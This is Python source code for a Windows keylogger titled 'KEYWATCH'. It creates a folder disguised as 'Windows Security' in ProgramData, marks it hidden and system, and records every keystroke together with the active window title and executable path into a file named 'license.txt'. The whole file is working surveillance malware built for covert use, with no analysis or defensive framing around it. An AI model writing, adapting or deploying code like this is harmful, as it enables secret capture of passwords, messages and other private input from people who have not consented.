
#██╗░░██╗███████╗██╗░░░██╗░██╗░░░░░░░██╗░█████╗░████████╗░█████╗░██╗░░██╗
#██║░██╔╝██╔════╝╚██╗░██╔╝░██║░░██╗░░██║██╔══██╗╚══██╔══╝██╔══██╗██║░░██║
#█████═╝░█████╗░░░╚████╔╝░░╚██╗████╗██╔╝███████║░░░██║░░░██║░░╚═╝███████║
#██╔═██╗░██╔══╝░░░░╚██╔╝░░░░████╔═████║░██╔══██║░░░██║░░░██║░░██╗██╔══██║
#██║░╚██╗███████╗░░░██║░░░░░╚██╔╝░╚██╔╝░██║░░██║░░░██║░░░╚█████╔╝██║░░██║
#╚═╝░░╚═╝╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝

import os
import time
import keyboard
import win32gui
import win32process
import psutil
from win32con import FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_SYSTEM
from win32api import SetFileAttributes

hidden_folder = os.path.join(os.environ['ProgramData'], 'Windows Security')
os.makedirs(hidden_folder, exist_ok=True)

attributes = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
SetFileAttributes(hidden_folder, attributes)

log_file = os.path.join(hidden_folder, 'license.txt')

KEY_MAP = {
    " ": "[SPACE]",
    "space": "[SPACE]",
    "enter": "[ENTER]",
    "esc": "[ESC]",
    "ctrl": "[CTRL]",
    "alt": "[ALT]",
    "alt gr": "[ALT GR]",
    "tab": "[TAB]",
    "shift": "[SHIFT]",
    "maj": "[SHIFT]",
    "backspace": "[BACKSPACE]",
    "caps lock": "[CAPS LOCK]",
    "verr.maj": "[CAPS LOCK]",
    "up": "[UP]",
    "haut": "[UP]",
    "down": "[DOWN]",
    "bas": "[DOWN]",
    "left": "[LEFT]",
    "gauche": "[LEFT]",
    "right": "[RIGHT]",
    "droite": "[RIGHT]",
    "page up": "[PAGE UP]",
    "pg.suiv": "[PAGE UP]",
    "page down": "[PAGE DOWN]",
    "pg. prec": "[PAGE DOWN]",
    "home": "[HOME]",
    "end": "[END]",
    "fin": "[END]",
    "insert": "[INSERT]",
    "delete": "[DELETE]",
    "suppr": "[DELETE]",
    "windows gauche": "[LEFT WINDOWS]",
    "f1": "[F1]",
    "f2": "[F2]",
    "f3": "[F3]",
    "f4": "[F4]",
    "f5": "[F5]",
    "f6": "[F6]",
    "f7": "[F7]",
    "f8": "[F8]",
    "f9": "[F9]",
    "f10": "[F10]",
    "f11": "[F11]",
    "f12": "[F12]",
}

def get_window_details():
    hwnd = win32gui.GetForegroundWindow()
    window_title = win32gui.GetWindowText(hwnd)

    if window_title != get_window_details.last_window_title:
        _, process_id = win32process.GetWindowThreadProcessId(hwnd)
        process_path = psutil.Process(process_id).exe()
        executable = os.path.basename(process_path)
        get_window_details.last_window_title = window_title
        get_window_details.last_details = (window_title, executable, process_path)

    return get_window_details.last_details

get_window_details.last_window_title = ""
get_window_details.last_details = ("", "", "")


def write_keys(keys_pressed, last_time, file):
    with open(file, "a", buffering=1) as f:
        current_time = time.time()
        time_diff = current_time - last_time
        window_title, executable, process_path = get_window_details()

        if window_title != write_keys.last_window_title:
            f.write("\n[WINDOW TITLE] -> {} |".format(window_title))
            f.write(" [EXE] -> {} |".format(executable))
            f.write(" [PATH] -> {}\n".format(process_path))
            write_keys.last_window_title = window_title

        if time_diff >= 1:
            time_str = "({} s)".format(int(time_diff))
            if time_diff < 2:
                time_str = "({} ms)".format(int(time_diff * 1000))
            if keys_pressed:
                f.write("{} {} ".format(time_str, ''.join(keys_pressed)))
                keys_pressed.clear()
        else:
            if keys_pressed:
                f.write(''.join(keys_pressed))
                keys_pressed.clear()

write_keys.last_window_title = ""

def on_press(event):
    if hasattr(event, 'name'):
        key = KEY_MAP.get(event.name)
        if key or event.name.isprintable():
            keys_pressed = {key} if key else {event.name}

            try:
                write_keys(keys_pressed, on_press.last_time, log_file)
            except Exception:
                pass

            on_press.last_time = time.time()


def main():
    while True:
        if keyboard.is_pressed('e'):
            break

    with open(log_file, "a", buffering=1) as f:
        f.write("\nLancement du script le {} à {}\n".format(
            time.strftime("%Y-%m-%d", time.localtime()),
            time.strftime("%H:%M:%S", time.localtime())
        ))

    on_press.last_time = time.time()

    keyboard.on_press(on_press)
    keyboard.wait()

if __name__ == "__main__":
    main()
